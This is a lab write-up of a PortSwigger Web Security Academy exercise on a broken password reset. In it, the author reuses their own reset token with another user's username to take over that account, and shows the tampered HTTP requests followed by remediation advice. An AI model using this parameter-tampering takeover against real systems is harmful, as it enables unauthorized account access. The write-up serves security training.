# Lab Writeup: Password Reset Broken Logic

**Category:** Authentication
**Difficulty:** Apprentice
**Date Completed:** 27/02/2026
**Platform:** PortSwigger Web Security Academy

---

## 1. Objective

Exploit a broken password reset mechanism to reset Carlos's password and log into his account — without access to his email.

---

## 2. Vulnerability Overview

**Vulnerability Name:** Broken Password Reset — Missing Token-to-User Binding
**CWE Reference:** CWE-640: Weak Password Recovery Mechanism for Forgotten Password
**OWASP Category:** A07:2021 – Identification and Authentication Failures

**What is this vulnerability?**
Password reset flows typically issue a unique, time-limited token sent to the user's email. The server is supposed to validate both that the token is valid *and* that the token belongs to the user requesting the reset. In this lab, the server only checks if a token exists in the request — it does not verify that the token matches the user whose password is being changed. This allows an attacker to obtain their own valid token and use it to reset another user's password.

---

## 3. Reconnaissance & Discovery

- Explored the application's full functionality as an unauthenticated user.
- Located the "Forgot Password" feature at `/forgot-password`.
- Triggered a password reset for `wiener` (my own account) and checked the email link.
- Intercepted the password reset form submission in Burp Suite and analyzed the parameters being sent.
- **Key Observation:** The POST request to complete the password reset included a `username` field alongside the reset token. This suggests the token might not be cryptographically tied to the username at the server.

**Tool(s) Used:** Burp Suite Community Edition

---

## 4. Exploitation Steps

### Step 1: Trigger Password Reset for My Account (wiener)
Navigated to `/forgot-password` and requested a reset for `wiener`.

**Request:**
```
POST /forgot-password HTTP/2
Host: [lab-id].web-security-academy.net
Content-Type: application/x-www-form-urlencoded

username=wiener
```

**Response:** Reset email sent. Retrieved the reset link from the email client.

### Step 2: Intercept the Password Reset Submission
Clicked the link in the email, which opened a form to set a new password. Before submitting, I intercepted the request in Burp Suite.

**Request (Original):**
```
POST /forgot-password?temp-forgot-password-token=<TOKEN> HTTP/2
Host: [lab-id].web-security-academy.net
Content-Type: application/x-www-form-urlencoded

temp-forgot-password-token=<TOKEN>&username=wiener&new-password-1=test123&new-password-2=test123
```

### Step 3: Modify the Username Parameter
In Burp Repeater, I changed `username=wiener` to `username=carlos`, keeping `wiener`'s valid reset token.

**Modified Request:**
```
POST /forgot-password?temp-forgot-password-token=<TOKEN> HTTP/2
Host: [lab-id].web-security-academy.net
Content-Type: application/x-www-form-urlencoded

temp-forgot-password-token=<TOKEN>&username=carlos&new-password-1=hacked123&new-password-2=hacked123
```

**Response:**
```
HTTP/2 302 Found
Location: /login
```

The server accepted the request and changed **Carlos's** password using **wiener's** reset token.

### Step 4: Log In as Carlos
Navigated to `/login` and logged in with:
- **Username:** `carlos`
- **Password:** `hacked123`

### Step 5: Lab Solved ✅

---

## 5. Root Cause Analysis

The server generates a password reset token and sends it to the user's email (correct behavior). However, when the reset form is submitted, the server validates only that a token string exists in the request — it does **not** verify that the submitted token is associated with the submitted username in its database.

The server logic is essentially: *"Is there a valid token in this request? Yes → change the password for the username in the request."* The correct logic should be: *"Is there a valid token in this request, AND does it belong to the username in this request? Only then → change the password."*

---

## 6. Impact

- [x] Account Takeover (of any user account)
- [x] Authentication Bypass

**Severity:** Critical
**Justification:** An attacker can take over any user account — including administrator accounts — by simply knowing the target's username. The attacker needs no access to the target's email. The password reset mechanism, designed to help users regain access, becomes a direct attack vector.

---

## 7. Remediation

1. **Bind token to user at issuance:** When generating the reset token, store it in the database linked to a specific user ID (not username). On submission, validate that `token → user` mapping matches the submitted username.
2. **Do not expose username in the reset form:** Remove the `username` field from the POST request entirely. The token alone should be enough to identify the user.
3. **Make tokens single-use:** Invalidate the token immediately after it is used once.
4. **Set token expiry:** Reset tokens should expire after a short window (e.g., 15 minutes).
5. **Rate limit reset requests:** Prevent enumeration or abuse of the reset endpoint.

---

## 8. Key Takeaways / What I Learned

- **Always test all parameters in sensitive flows.** The `username` parameter in a password reset is a red flag — the server should already know who the token belongs to.
- **Never trust user-supplied values for authorization decisions.** The server must validate the relationship between a token and a user in its own data store.
- **Burp Repeater is the primary tool** for manually modifying and replaying requests to test parameter manipulation.

---

## 9. References

- [PortSwigger Lab: Password Reset Broken Logic](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic)
- [OWASP: Forgot Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html)
- [CWE-640: Weak Password Recovery Mechanism](https://cwe.mitre.org/data/definitions/640.html)
